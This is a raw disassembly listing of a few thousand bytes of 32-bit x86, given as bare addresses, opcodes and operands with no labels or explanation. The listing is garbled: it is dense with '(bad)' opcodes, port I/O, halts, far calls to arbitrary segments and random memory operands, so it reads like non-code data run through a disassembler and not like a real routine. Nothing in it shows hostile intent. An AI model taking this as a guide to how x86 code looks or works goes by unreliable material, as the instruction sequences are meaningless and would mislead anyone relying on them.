  513b01:	adc    ebx,ebp
  513b03:	cmp    DWORD PTR [edx-0x70],ecx
  513b06:	popf   
  513b07:	pop    ebp
  513b08:	xor    BYTE PTR [ebp-0x618f4113],cl
  513b0e:	sbb    BYTE PTR ds:0x5f8a24e2,al
  513b14:	stos   DWORD PTR es:[edi],eax
  513b15:	xchg   esp,eax
  513b16:	in     al,dx
  513b17:	bound  eax,QWORD PTR [ebx]
  513b19:	mov    al,0x80
  513b1b:	add    edx,edx
  513b1d:	in     al,dx
  513b1e:	mov    ch,0x7c
  513b20:	cwde   
  513b21:	lods   al,BYTE PTR ds:[esi]
  513b22:	scas   al,BYTE PTR es:[edi]
  513b23:	mov    DWORD PTR [ecx+0x72],ecx
  513b26:	fdiv   DWORD PTR [ebx+0x34c0461d]
  513b2c:	test   BYTE PTR [esi+0xece08ac],bl
  513b32:	ja     0x513b5f
  513b34:	mul    DWORD PTR [edx]
  513b36:	push   ebp
  513b37:	pop    eax
  513b38:	call   0xde22:0x80a76813
  513b3f:	repz neg eax
  513b42:	(bad)  
  513b43:	cli    
  513b44:	push   esp
  513b45:	dec    ebx
  513b46:	add    al,0xf
  513b48:	mov    ebp,DWORD PTR fs:[ebx+0x755505ab]
  513b4f:	inc    ecx
  513b50:	fwait
  513b51:	dec    edi
  513b52:	mov    ds:0x4ffead8e,eax
  513b57:	stc    
  513b58:	cli    
  513b59:	popf   
  513b5a:	and    eax,0x5e8acb20
  513b5f:	xor    DWORD PTR [ebp-0x16896931],ebx
  513b65:	add    eax,0x31bf4ed8
  513b6a:	pop    ebx
  513b6b:	push   cs
  513b6c:	fiadd  DWORD PTR [esi]
  513b6e:	in     eax,0x34
  513b70:	shl    cl,0xe1
  513b73:	adc    eax,0xfc1c5ef0
  513b78:	pop    ss
  513b79:	inc    esi
  513b7a:	add    BYTE PTR [esi-0x36],ch
  513b7d:	call   0x85270c11
  513b82:	test   ebx,eax
  513b84:	add    bh,BYTE PTR [esi+eiz*4-0x4bc810f3]
  513b8b:	add    esp,DWORD PTR [edx-0x6ab79acd]
  513b91:	mov    ds:0x3bcbc327,eax
  513b96:	jmp    0x3e1ab28b
  513b9b:	xor    ebx,DWORD PTR [esi-0x74]
  513b9e:	(bad)  
  513b9f:	or     ah,BYTE PTR [ecx]
  513ba1:	xor    eax,0xcb7db874
  513ba6:	into   
  513ba7:	jo     0x513b4a
  513ba9:	mov    ebx,0x2a626dd6
  513bae:	ret    
  513baf:	int3   
  513bb0:	shl    DWORD PTR [ebx+0x2670934d],cl
  513bb6:	adc    DWORD PTR [ecx+0x2aa0d1ea],ebp
  513bbc:	out    0xbe,eax
  513bbe:	sub    ebx,edx
  513bc0:	or     BYTE PTR [esi+ebx*1],al
  513bc3:	add    ebx,edi
  513bc5:	pop    edx
  513bc6:	in     eax,dx
  513bc7:	cld    
  513bc8:	fwait
  513bc9:	stos   DWORD PTR es:[edi],eax
  513bca:	dec    edi
  513bcb:	sahf   
  513bcc:	jecxz  0x513bd4
  513bce:	push   ss
  513bcf:	scas   al,BYTE PTR es:[edi]
  513bd0:	jo     0x513b8a
  513bd2:	into   
  513bd3:	dec    eax
  513bd4:	or     al,0xaf
  513bd6:	pop    ebx
  513bd7:	cmp    DWORD PTR [edx-0x5b],esi
  513bda:	das    
  513bdb:	push   0x562a1fe7
  513be0:	fs push ss
  513be2:	stos   DWORD PTR es:[edi],eax
  513be3:	fisubr WORD PTR [edx-0x25a21239]
  513be9:	xchg   esi,eax
  513bea:	into   
  513beb:	mov    dl,0xb7
  513bed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  513bee:	in     eax,dx
  513bef:	inc    esp
  513bf0:	cmp    eax,0x94415fd6
  513bf5:	inc    ebp
  513bf6:	or     al,0x79
  513bf8:	hlt    
  513bf9:	push   edx
  513bfa:	xor    cl,al
  513bfc:	arpl   WORD PTR [edx+0x337eb7fd],dx
  513c02:	cmc    
  513c03:	mov    ah,0xdd
  513c05:	push   0xffffffa0
  513c07:	mov    ebp,0x4479132a
  513c0c:	xor    bl,BYTE PTR [eax+0x4e56f0a3]
  513c12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  513c13:	mov    eax,ds:0xaf0fc6b0
  513c18:	pop    edi
  513c19:	add    eax,0x18e845a1
  513c1e:	adc    cl,BYTE PTR [esi]
  513c20:	lock sub al,0xd9
  513c23:	dec    esp
  513c24:	(bad)  
  513c25:	in     eax,0xdd
  513c27:	mov    ah,0x4c
  513c29:	dec    edi
  513c2a:	inc    esp
  513c2b:	and    BYTE PTR [ebx-0x7825d16d],al
  513c31:	and    edx,DWORD PTR [ecx-0x6d]
  513c34:	adc    al,BYTE PTR [eax+0x37c24cce]
  513c3a:	inc    edi
  513c3b:	and    ch,0xc7
  513c3e:	ret    
  513c3f:	fiadd  WORD PTR [edi]
  513c41:	mov    ?,WORD PTR [ecx+ebx*4]
  513c44:	jbe    0x513c95
  513c46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  513c47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  513c48:	fdivr  DWORD PTR [edi-0x30]
  513c4b:	(bad)  
  513c4c:	je     0x513c16
  513c4e:	mov    cl,0xf7
  513c50:	test   BYTE PTR [esi+0x1],al
  513c53:	fld    QWORD PTR [edi+0x62]
  513c56:	les    edi,FWORD PTR [esi+0x1]
  513c59:	(bad)  
  513c5b:	iret   
  513c5c:	icebp  
  513c5d:	sub    eax,0xe3d4b96f
  513c62:	arpl   dx,si
  513c64:	inc    esp
  513c65:	(bad)  
  513c66:	dec    esi
  513c67:	xchg   ecx,eax
  513c68:	add    ecx,ebx
  513c6a:	bound  eax,QWORD PTR [edx+0x2e]
  513c6d:	dec    ebx
  513c6e:	lahf   
  513c6f:	lods   al,BYTE PTR ds:[esi]
  513c70:	adc    ch,BYTE PTR [edi]
  513c72:	popf   
  513c73:	scas   eax,DWORD PTR es:[edi]
  513c74:	out    0x6c,al
  513c76:	add    BYTE PTR [edx-0x7e],ah
  513c79:	test   al,0xc1
  513c7b:	mov    ecx,0x191d9fe3
  513c80:	or     dl,bl
  513c82:	imul   BYTE PTR [eax+0x36]
  513c85:	cld    
  513c86:	mov    esi,0x13547bb2
  513c8b:	retf   
  513c8c:	test   al,0x91
  513c8e:	mov    al,ds:0x73d22a00
  513c93:	sbb    eax,0x58a8582
  513c98:	test   al,0x1f
  513c9a:	pop    eax
  513c9b:	xchg   BYTE PTR [edi-0x78232bdb],ch
  513ca1:	sub    BYTE PTR fs:[edx+0x79],dh
  513ca5:	mov    ?,WORD PTR ds:0x6b34e4a8
  513cab:	test   eax,0x930d30d
  513cb0:	cmp    BYTE PTR [edx+0x303b664],dl
  513cb6:	es mov eax,0xcdffb51d
  513cbc:	mov    dl,0x50
  513cbe:	sbb    DWORD PTR [edx+0x30],edi
  513cc1:	and    eax,DWORD PTR [ebp-0x6a]
  513cc4:	hlt    
  513cc5:	mov    bh,0xe9
  513cc7:	lods   eax,DWORD PTR ds:[esi]
  513cc8:	xor    ebx,DWORD PTR [edi+0x6a]
  513ccb:	mov    al,ds:0x6dc131de
  513cd0:	mov    eax,0x772c6ace
  513cd5:	ds call 0x573b4a5f
  513cdb:	pop    edx
  513cdc:	gs push eax
  513cde:	outs   dx,DWORD PTR ds:[esi]
  513cdf:	and    ch,BYTE PTR [edx]
  513ce1:	sar    BYTE PTR [ecx],0x3a
  513ce4:	mov    BYTE PTR [eax-0x46],bh
  513ce7:	mov    bh,0x3
  513ce9:	pusha  
  513cea:	mov    ebx,0xf4e3a791
  513cef:	jbe    0x513d0b
  513cf1:	xchg   DWORD PTR [ebp-0x5d],esp
  513cf4:	std    
  513cf5:	adc    dh,cl
  513cf7:	and    DWORD PTR [edx+0xe],ecx
  513cfa:	add    eax,0xac2d03df
  513cff:	jne    0x513c82
  513d01:	jge    0x513cd7
  513d03:	lss    edx,FWORD PTR [ebx]
  513d06:	jae    0x513c96
  513d08:	cdq    
  513d09:	jle    0x513c96
  513d0b:	leave  
  513d0c:	cmp    eax,0xba0d04a7
  513d11:	sub    dh,BYTE PTR [ebx+0x4f]
  513d14:	push   esi
  513d15:	jnp    0x513cfb
  513d17:	push   0xa306b4f9
  513d1c:	sub    DWORD PTR [ebx],ebp
  513d1e:	aad    0xc5
  513d20:	or     BYTE PTR [ebp+0x47],ch
  513d23:	lock add DWORD PTR [edx-0x59],0x8329ca72
  513d2b:	cmp    DWORD PTR [edi-0x15d11319],esp
  513d31:	shr    BYTE PTR [ebx+0x7],1
  513d34:	mov    BYTE PTR [edi],dl
  513d36:	in     al,dx
  513d37:	sbb    DWORD PTR [esi],eax
  513d39:	sbb    BYTE PTR [ecx-0x6d],al
  513d3c:	adc    al,0x2e
  513d3e:	pop    es
  513d3f:	adc    ebp,DWORD PTR [edi-0x21]
  513d42:	or     ah,cl
  513d44:	jbe    0x513dac
  513d46:	inc    ebx
  513d47:	ds retf 0xd9a4
  513d4b:	pop    edx
  513d4c:	out    dx,al
  513d4d:	mov    edx,0x1c357271
  513d52:	xchg   esi,eax
  513d53:	retf   
  513d54:	mov    bh,0xc3
  513d56:	or     eax,0x72cfffc0
  513d5b:	mov    al,0xd3
  513d5d:	sbb    DWORD PTR [edi+0x3f],edx
  513d60:	push   0xffffffb8
  513d62:	shl    BYTE PTR ds:0xae058e8,1
  513d68:	loopne 0x513d7d
  513d6a:	dec    ebx
  513d6b:	mov    esp,0xa90ceaa
  513d70:	push   es
  513d71:	xchg   BYTE PTR [eax],dh
  513d73:	mov    cl,0x95
  513d75:	aad    0x5e
  513d77:	xor    DWORD PTR [ecx],0xd949c222
  513d7d:	loope  0x513dc2
  513d7f:	push   esp
  513d80:	data16 daa 
  513d82:	lods   al,BYTE PTR ds:[esi]
  513d83:	mov    ah,0x1
  513d85:	ret    0x4408
  513d88:	aam    0x3e
  513d8a:	dec    ebp
  513d8b:	jb     0x513d1d
  513d8d:	jno    0x513d9f
  513d8f:	fst    QWORD PTR [edi-0x5fd93629]
  513d95:	inc    edx
  513d96:	pop    edx
  513d97:	dec    ebp
  513d98:	jbe    0x513da3
  513d9a:	add    dh,BYTE PTR ds:0xb0aee44e
  513da0:	scas   al,BYTE PTR es:[edi]
  513da1:	ins    DWORD PTR es:[edi],dx
  513da2:	fidiv  WORD PTR [ebx+ebp*1-0x5f]
  513da6:	cvttps2pi mm3,QWORD PTR [esi+0x735e9874]
  513dad:	je     0x513d7d
  513daf:	rcl    dl,0x3d
  513db2:	retf   
  513db3:	lahf   
  513db4:	push   esi
  513db5:	add    al,0x3d
  513db7:	jo     0x513da2
  513db9:	ins    BYTE PTR es:[edi],dx
  513dba:	xor    BYTE PTR [ecx],bl
  513dbc:	out    0x33,eax
  513dbe:	and    DWORD PTR [ebx],eax
  513dc0:	cmp    edx,DWORD PTR ds:0x670eb970
  513dc6:	push   cs
  513dc7:	mov    bh,0x2a
  513dc9:	in     eax,0x3
  513dcb:	ror    DWORD PTR [ebp+0x72a9515d],0x6d
  513dd2:	call   0xf79f42ca
  513dd7:	fs ss stc 
  513dda:	pop    edi
  513ddb:	not    BYTE PTR [ecx+0x36]
  513dde:	retf   0xc5aa
  513de1:	gs fcomi st,st(6)
  513de4:	sahf   
  513de5:	mov    edi,0x9a5671de
  513dea:	sbb    cl,BYTE PTR ds:0x66134af6
  513df0:	imul   ecx,DWORD PTR [ecx-0x13],0x25
  513df4:	push   ebp
  513df5:	pop    es
  513df6:	sbb    BYTE PTR [esi],bh
  513df8:	mov    edi,0x61f610ab
  513dfd:	pop    ecx
  513dfe:	or     eax,0xefe05792
  513e03:	repz inc ebp
  513e05:	rcl    DWORD PTR [edx],cl
  513e07:	lods   al,BYTE PTR ds:[esi]
  513e08:	fs out 0xfb,al
  513e0b:	lea    esp,[ebx]
  513e0d:	fisttp QWORD PTR [esi-0x29eb19f9]
  513e13:	pusha  
  513e14:	mov    BYTE PTR [edx],bh
  513e16:	frstor [esi+0x4f8736d]
  513e1c:	sbb    eax,0x1091646c
  513e21:	xchg   ebx,eax
  513e22:	fdivrp st(6),st
  513e25:	fsubr  st,st(4)
  513e27:	adc    al,0x21
  513e29:	cdq    
  513e2a:	push   esi
  513e2b:	out    0x2a,eax
  513e2d:	call   0x717d:0x1afd0539
  513e34:	mov    ecx,0x44bacfe4
  513e39:	adc    al,0xb5
  513e3b:	fprem1 
  513e3d:	push   ss
  513e3e:	cdq    
  513e3f:	or     DWORD PTR [esi],0xffffffa3
  513e42:	push   DWORD PTR ds:[ebx+eiz*1-0x52]
  513e47:	cld    
  513e48:	fldcw  WORD PTR [edi]
  513e4a:	pop    ebx
  513e4b:	lock jae 0x513eba
  513e4e:	xchg   edx,eax
  513e4f:	pop    esp
  513e50:	lods   al,BYTE PTR ds:[esi]
  513e51:	fstp   DWORD PTR [ecx+0xed2cdaf]
  513e57:	xchg   esi,eax
  513e58:	adc    al,0x9e
  513e5a:	dec    ebp
  513e5b:	and    esp,DWORD PTR ds:0x5182772a
  513e61:	or     esp,ecx
  513e63:	dec    esi
  513e64:	ss and WORD PTR es:[esi],cx
  513e69:	in     eax,0xe2
  513e6b:	fadd   st(2),st
  513e6d:	jnp    0x513ebb
  513e6f:	loop   0x513e0c
  513e71:	mov    cl,0xbc
  513e73:	imul   edi,DWORD PTR [esi],0x1
  513e76:	inc    esp
  513e77:	test   al,0x87
  513e79:	xor    ch,cl
  513e7b:	mov    cs,WORD PTR [edx-0x25a77a34]
  513e81:	mov    al,ds:0xec5f383e
  513e86:	leave  
  513e87:	fwait
  513e88:	dec    eax
  513e89:	dec    BYTE PTR [ebx-0x3bee721e]
  513e8f:	popa   
  513e90:	sub    ebp,DWORD PTR [edx-0x3e0b7b23]
  513e96:	xchg   DWORD PTR [ebx],edx
  513e98:	ds xor eax,0xa08a32e7
  513e9e:	(bad)  
  513e9f:	push   0xffffff8d
  513ea1:	pushf  
  513ea2:	fcom   QWORD PTR [eax+0x22]
  513ea5:	rcpps  xmm6,XMMWORD PTR [ebx-0x658524dd]
  513eac:	xchg   ecx,edx
  513eae:	mov    ds:0xe1d9bc3b,eax
  513eb3:	in     eax,dx
  513eb4:	xor    al,BYTE PTR [ecx]
  513eb6:	pop    esp
  513eb7:	or     bh,BYTE PTR [edx]
  513eb9:	cmp    bl,BYTE PTR [ecx]
  513ebb:	and    esp,DWORD PTR [edx+0x7f]
  513ebe:	sub    al,0x20
  513ec0:	clc    
  513ec1:	je     0x513ef5
  513ec3:	pop    edx
  513ec4:	clc    
  513ec5:	xchg   BYTE PTR [ebp-0x26],ch
  513ec8:	cmc    
  513ec9:	dec    esi
  513eca:	mov    edi,0x6e00a15c
  513ecf:	ror    BYTE PTR [ebp+0x4c2b7e33],1
  513ed5:	ret    
  513ed6:	pop    esp
  513ed7:	jle    0x513e5e
  513ed9:	mov    ebx,ecx
  513edb:	add    dh,bl
  513edd:	in     al,dx
  513ede:	fdiv   DWORD PTR [esi]
  513ee0:	or     DWORD PTR [esi-0x9],ebp
  513ee3:	pop    ebp
  513ee4:	fimul  WORD PTR [ecx+0x3d4a101f]
  513eea:	mov    ah,0x9e
  513eec:	and    BYTE PTR [ecx+0x74],dl
  513eef:	dec    esi
  513ef0:	mov    ch,0x71
  513ef2:	hlt    
  513ef3:	fdivr  DWORD PTR [ebx+0x22]
  513ef6:	cwde   
  513ef7:	push   ss
  513ef8:	sbb    BYTE PTR [eax],bl
  513efa:	(bad)
  513efd:	call   0xa63c:0x7d14f7ad
  513f04:	aad    0x41
  513f06:	popf   
  513f07:	int    0x9f
  513f09:	popa   
  513f0a:	jg     0x513ecb
  513f0c:	cmc    
  513f0d:	cli    
  513f0e:	add    al,0x3f
  513f10:	ficom  WORD PTR [ebx+0x1602e546]
  513f16:	push   ss
  513f17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  513f18:	push   0xffffff85
  513f1a:	xchg   esp,eax
  513f1b:	leave  
  513f1c:	pop    edi
  513f1d:	dec    esp
  513f1e:	cli    
  513f1f:	scas   eax,DWORD PTR es:[edi]
  513f20:	inc    edi
  513f21:	or     al,0xf1
  513f23:	divps  xmm5,XMMWORD PTR [edx+0x657c8e23]
  513f2a:	push   edx
  513f2b:	sbb    BYTE PTR [esi-0x5e],cl
  513f2e:	mov    dh,0x46
  513f30:	dec    edx
  513f31:	int3   
  513f32:	ret    0x7e34
  513f35:	push   ebx
  513f36:	loope  0x513f02
  513f38:	rcl    dh,1
  513f3a:	rol    BYTE PTR [edx+0x20],0x83
  513f3e:	inc    ebp
  513f3f:	rcr    eax,1
  513f41:	cmpxchg DWORD PTR [edi],esi
  513f44:	in     eax,0xdd
  513f46:	pusha  
  513f47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  513f48:	lea    ecx,[esi+eiz*2-0x2a]
  513f4c:	cwde   
  513f4d:	jmp    0xbe118f74
  513f52:	scas   al,BYTE PTR es:[edi]
  513f53:	mov    ebp,0x42cee9fe
  513f58:	gs jg  0x513f10
  513f5b:	mov    BYTE PTR [ebp+0x6dd8619e],cl
  513f61:	mov    ebp,cs
  513f63:	and    DWORD PTR [ebp-0x39650a80],edi
  513f69:	setns  BYTE PTR [edx-0x7e]
  513f6d:	sbb    bl,BYTE PTR [esi]
  513f6f:	call   0x8b4c3d0d
  513f74:	repnz rcl BYTE PTR [edx],0x19
  513f78:	(bad)  
  513f79:	ss sti 
  513f7b:	jle    0x513fa5
  513f7d:	into   
  513f7e:	test   eax,0xd5586b17
  513f83:	je     0x513f41
  513f85:	fild   DWORD PTR [ebp+0x36]
  513f88:	mov    edi,0xd90d20d
  513f8d:	aam    0x7a
  513f8f:	xchg   BYTE PTR ds:0xb1612c8a,bl
  513f95:	add    DWORD PTR [esi+0x53],eax
  513f98:	mov    esp,0x1c4e2970
  513f9d:	outs   dx,BYTE PTR ds:[esi]
  513f9e:	inc    edx
  513f9f:	and    eax,0x477a5527
  513fa4:	xchg   esp,eax
  513fa5:	inc    ecx
  513fa6:	or     esi,ebx
  513fa8:	std    
  513fa9:	loopne 0x513fb7
  513fab:	aas    
  513fac:	sti    
  513fad:	adc    BYTE PTR [edi-0x34],cl
  513fb0:	js     0x51402e
  513fb2:	add    al,0xb7
  513fb4:	sub    esi,DWORD PTR [ebx+ebp*2+0x1d]
  513fb8:	push   0xf1fe202e
  513fbd:	mov    ch,0xc
  513fbf:	out    dx,al
  513fc0:	popa   
  513fc1:	jl     0x513f7a
  513fc3:	xchg   esi,eax
  513fc4:	sub    ecx,esp
  513fc6:	sub    eax,esi
  513fc8:	cmp    cl,BYTE PTR [ebx-0x33]
  513fcb:	xchg   edi,eax
  513fcc:	std    
  513fcd:	ds sub eax,0xb431d687
  513fd3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  513fd4:	jns    0x513f9c
  513fd6:	adc    eax,0x5b133c78
  513fdb:	mov    ch,0x2c
  513fdd:	xor    BYTE PTR [ebx+0x7b],ah
  513fe0:	jmp    0xbe5c34f6
  513fe5:	out    dx,al
  513fe6:	imul   ebx,DWORD PTR [ecx-0x1b],0x49
  513fea:	sti    
  513feb:	mov    ch,0x22
  513fed:	mov    bl,0x4c
  513fef:	repz arpl ax,sp
  513ff2:	dec    esi
  513ff3:	xor    BYTE PTR ds:0xb1b97f3b,cl
  513ff9:	into   
  513ffa:	mov    bl,0x37
  513ffc:	aam    0x4
  513ffe:	jno    0x513f9e
  514000:	xchg   esp,eax
  514001:	ds dec ebp
  514003:	test   eax,0xb64e2509
  514008:	call   0xf796613e
  51400d:	sti    
  51400e:	adc    ebx,DWORD PTR [edi-0x3fb18929]
  514014:	xchg   BYTE PTR [edx],dh
  514016:	fadd   DWORD PTR [edi-0x14593645]
  51401c:	repz fwait
  51401e:	aas    
  51401f:	adc    eax,0xf25c5385
  514024:	push   ds
  514025:	cmp    ecx,DWORD PTR [ebx]
  514027:	jae    0x513ffe
  514029:	cs sbb edi,0x5299ea9
  514030:	lds    ecx,FWORD PTR [edx]
  514032:	push   ebp
  514033:	push   es
  514034:	xor    ebp,esp
  514036:	out    0xe,eax
  514038:	mov    bl,0x87
  51403a:	or     dh,BYTE PTR [eax-0x7f]
  51403d:	xchg   esp,eax
  51403e:	arpl   WORD PTR [edi-0x78],dx
  514041:	hlt    
  514042:	and    al,BYTE PTR [edx]
  514044:	sub    ebp,DWORD PTR [di-0x2ad4]
  514049:	(bad)  
  51404a:	icebp  
  51404b:	adc    edx,ebx
  51404d:	or     eax,0x8e08ba3f
  514052:	xor    al,BYTE PTR ds:0xfe23b6eb
  514058:	push   edx
  514059:	ret    
  51405a:	push   edx
  51405b:	push   esi
  51405c:	or     bh,bh
  51405e:	bt     DWORD PTR [edi-0x5],esi
  514062:	push   ebx
  514063:	pop    ecx
  514064:	les    ebp,FWORD PTR [ecx-0x2ce07f1b]
  51406a:	sub    al,BYTE PTR [ebp+0x68]
  51406d:	das    
  51406e:	and    BYTE PTR ds:0xc1f61b5e,ah
  514074:	mov    ds:0xda82f467,eax
  514079:	mov    ebp,0xcb5cfda6
  51407e:	sub    BYTE PTR [edi],ah
  514080:	add    al,0xe3
  514082:	xor    edi,DWORD PTR [eax]
  514084:	retf   
  514085:	mov    eax,ds:0xc96034d
  51408a:	ins    DWORD PTR es:[edi],dx
  51408b:	mov    ebp,0x80b9d61e
  514090:	push   ecx
  514091:	inc    esp
  514092:	clc    
  514093:	xlat   BYTE PTR ds:[ebx]
  514094:	mov    ds:0xf47ae70b,eax
  514099:	cwde   
  51409a:	daa    
  51409b:	call   0x907cbd2a
  5140a0:	(bad)  
  5140a1:	(bad)  
  5140a2:	ret    
  5140a3:	outs   dx,DWORD PTR ds:[esi]
  5140a4:	push   esi
  5140a5:	xor    ch,ch
  5140a7:	jmp    0x8a85a09b
  5140ac:	popf   
  5140ad:	hlt    
  5140ae:	dec    ebx
  5140af:	dec    ebp
  5140b0:	bound  edx,QWORD PTR [ecx+0x49]
  5140b3:	cmp    DWORD PTR [edx],esp
  5140b5:	les    ecx,FWORD PTR ds:0x519405d5
  5140bb:	mov    bl,bh
  5140bd:	adc    DWORD PTR [edx],0xffffffc5
  5140c0:	cmp    DWORD PTR [eax-0x6cad3735],0xffffffb4
  5140c7:	push   es
  5140c8:	ins    DWORD PTR es:[edi],dx
  5140c9:	fist   WORD PTR [esi-0x38]
  5140cc:	popa   
  5140cd:	jecxz  0x5140cc
  5140cf:	nop
  5140d0:	pop    ds
  5140d1:	jbe    0x5140b9
  5140d3:	jge    0x514129
  5140d5:	ja     0x514078
  5140d7:	js     0x5140ea
  5140d9:	adc    eax,0x3eb2f60
  5140de:	sti    
  5140df:	retf   
  5140e0:	cwde   
  5140e1:	xchg   esp,eax
  5140e2:	and    eax,0x24e73100
  5140e7:	sbb    BYTE PTR [ebp+0x17f907a7],0xb3
  5140ee:	jmp    0x5140c2
  5140f0:	into   
  5140f1:	scas   al,BYTE PTR es:[edi]
  5140f2:	and    eax,0x6f5bfbe4
  5140f7:	mov    ds:0x4b1235c5,eax
  5140fc:	adc    al,0x5
  5140fe:	sbb    bl,ah
  514100:	sbb    eax,0xc51e5b
  514105:	out    0x20,eax
  514107:	add    al,0xfb
  514109:	call   0x423c:0xaf85b389
  514110:	push   ds
  514111:	add    eax,0x7ff881c2
  514116:	jle    0x514164
  514118:	pop    edi
  514119:	inc    ecx
  51411a:	sti    
  51411b:	repnz retf 0x4d37
  51411f:	loop   0x514155
  514121:	sub    esp,DWORD PTR [ebp+0x6c2be4dd]
  514127:	loopne 0x5140ed
  514129:	test   al,0xd8
  51412b:	fwait
  51412c:	jp     0x60dcd464
  514132:	mov    eax,0x303c9d85
  514137:	stos   BYTE PTR es:[edi],al
  514138:	daa    
  514139:	xchg   BYTE PTR [ebx+0x16b4b0dc],dh
  51413f:	mov    BYTE PTR [esi-0x45],bl
  514142:	adc    esi,DWORD PTR [ebx-0x5e]
  514145:	xor    DWORD PTR [edx+0x37],esp
  514148:	lahf   
  514149:	inc    edi
  51414a:	lahf   
  51414b:	add    al,0xa7
  51414d:	fdiv   QWORD PTR [edx+edi*8-0x7c3d160e]
  514154:	out    dx,eax
  514155:	dec    BYTE PTR [esi]
  514157:	cmp    al,0x48
  514159:	push   cs
  51415a:	aas    
  51415b:	popa   
  51415c:	or     edx,eax
  51415e:	js     0x5141bd
  514160:	jno    0x5141ab
  514162:	out    0x98,al
  514164:	xchg   ebp,eax
  514165:	mov    esi,0x85571109
  51416a:	out    dx,eax
  51416b:	xor    eax,0xffd93363
  514170:	mov    ebx,0xd9f2405b
  514175:	in     eax,dx
  514176:	out    0x91,eax
  514178:	push   es
  514179:	xchg   ecx,eax
  51417a:	cmp    al,0xb1
  51417c:	pop    edx
  51417d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  51417e:	sbb    eax,DWORD PTR [eax-0x1bccbf27]
  514184:	and    ecx,edi
  514186:	sar    BYTE PTR [edi],0x78
  514189:	outs   dx,BYTE PTR ds:[esi]
  51418a:	sub    bl,bl
  51418c:	retf   0xed2f
  51418f:	ret    
  514190:	or     al,0x67
  514192:	jb     0x51417c
  514194:	(bad)  
  514195:	or     eax,DWORD PTR gs:[ecx-0x4b]
  514199:	sbb    BYTE PTR [ecx-0x6d5edd76],bl
  51419f:	jnp    0x51415a
  5141a1:	mov    WORD PTR [edi+eiz*8-0x6e],es
  5141a5:	add    esi,DWORD PTR [esi]
  5141a7:	inc    ebp
  5141a8:	jmp    0x9f87:0x80888049
  5141af:	cmp    eax,0xf574fc71
  5141b4:	push   eax
  5141b5:	loope  0x514199
  5141b7:	push   ebp
  5141b8:	ins    BYTE PTR es:[edi],dx
  5141b9:	mov    BYTE PTR [edi+0x6f],cl
  5141bc:	shl    DWORD PTR [ebx],cl
  5141be:	mov    ch,BYTE PTR [eax]
  5141c0:	in     eax,0xbe
  5141c2:	or     eax,0x11381d42
  5141c7:	push   es
  5141c8:	aam    0x20
  5141ca:	ds stc 
  5141cc:	das    
  5141cd:	sar    BYTE PTR [edx+0x75],0xa0
  5141d1:	jae    0x514190
  5141d3:	sub    BYTE PTR [ecx-0x2d],bl
  5141d6:	fild   WORD PTR [ecx+0x3eb6c683]
  5141dc:	lods   eax,DWORD PTR ds:[esi]
  5141dd:	and    edx,esi
  5141df:	lods   al,BYTE PTR ds:[esi]
  5141e0:	cmp    DWORD PTR ss:[ebx-0x1e],0xffffff93
  5141e5:	test   DWORD PTR [ebp-0x211f002f],esp
  5141eb:	fisub  WORD PTR [ebx+esi*4]
  5141ee:	or     DWORD PTR [edi+eiz*4],ebp
  5141f1:	push   esp
  5141f2:	repz xlat BYTE PTR ds:[ebx]
  5141f4:	call   0xe553:0x662aab2f
  5141fb:	cld    
  5141fc:	popf   
  5141fd:	pusha  
  5141fe:	cwde   
  5141ff:	mov    BYTE PTR [ecx],ch
  514201:	sar    BYTE PTR [edx],1
  514203:	jle    0x514236
  514205:	cli    
  514206:	fisubr DWORD PTR [edi+esi*8]
  514209:	xor    BYTE PTR [ebx-0x54],bl
  51420c:	ror    esi,0x2b
  51420f:	jne    0x5141ad
  514211:	sti    
  514212:	xor    ebx,DWORD PTR [eax-0x4be59671]
  514218:	push   0x43
  51421a:	sti    
  51421b:	mov    dh,0x43
  51421d:	xchg   edx,ebx
  51421f:	loopne 0x5141d1
  514221:	push   es
  514222:	addr16 pop es
  514224:	push   ss
  514225:	mov    dl,bl
  514227:	push   es
  514228:	retf   0x190c
  51422b:	add    eax,0x49588bf2
  514230:	inc    edx
  514231:	icebp  
  514232:	adc    DWORD PTR [eax],ebx
  514234:	cmp    ebx,DWORD PTR [edx]
  514236:	sub    DWORD PTR [edi+ecx*2-0x11],0x4d0551d0
  51423e:	and    DWORD PTR [eax],ecx
  514240:	fwait
  514241:	add    DWORD PTR [edx-0x63dfd9e2],ecx
  514247:	push   ecx
  514248:	ret    0x4b22
  51424b:	inc    ecx
  51424c:	scas   al,BYTE PTR es:[edi]
  51424d:	and    DWORD PTR [ebx-0x16acb43a],0x39
  514254:	test   eax,0x81837163
  514259:	and    eax,0x539292aa
  51425e:	rcr    BYTE PTR ds:0x86760fcb,cl
  514264:	fbld   TBYTE PTR [esi+0x7152ca7b]
  51426a:	inc    ecx
  51426b:	cs int3 
  51426d:	fadd   st(1),st
  51426f:	jge    0x514266
  514271:	(bad)  
  514272:	dec    edx
  514273:	js     0x514212
  514275:	nop
  514276:	adc    ch,bl
  514278:	sub    eax,0xd8320f1e
  51427d:	add    DWORD PTR [eax-0x46d856b2],0xffffff8c
  514284:	and    dh,BYTE PTR [edx]
  514286:	loope  0x5142fa
  514288:	xchg   esp,eax
  514289:	inc    eax
  51428a:	xchg   ecx,eax
  51428b:	dec    edi
  51428c:	mov    BYTE PTR [ebx+0x7b9874d6],0x7e
  514293:	or     BYTE PTR [ebp-0x7f],ah
  514296:	scas   eax,DWORD PTR es:[edi]
  514297:	push   ds
  514298:	into   
  514299:	enter  0x38a8,0xc1
  51429d:	sti    
  51429e:	in     al,0xbd
  5142a0:	cs push 0x522ac543
  5142a6:	xchg   edi,eax
  5142a7:	clc    
  5142a8:	add    eax,0x34851d96
  5142ad:	(bad)  
  5142ae:	neg    esi
  5142b0:	test   BYTE PTR [ecx+0x44],ch
  5142b3:	dec    ecx
  5142b4:	sbb    BYTE PTR [edi],0xc1
  5142b7:	sub    DWORD PTR [edx+edi*8-0x65578f0],edx
  5142be:	push   ebx
  5142bf:	repnz out 0x3e,eax
  5142c2:	stos   DWORD PTR es:[edi],eax
  5142c3:	std    
  5142c4:	aaa    
  5142c5:	mov    eax,0xbd5606e3
  5142ca:	xchg   edx,eax
  5142cb:	mov    ah,0x81
  5142cd:	nop
  5142ce:	outs   dx,DWORD PTR ds:[esi]
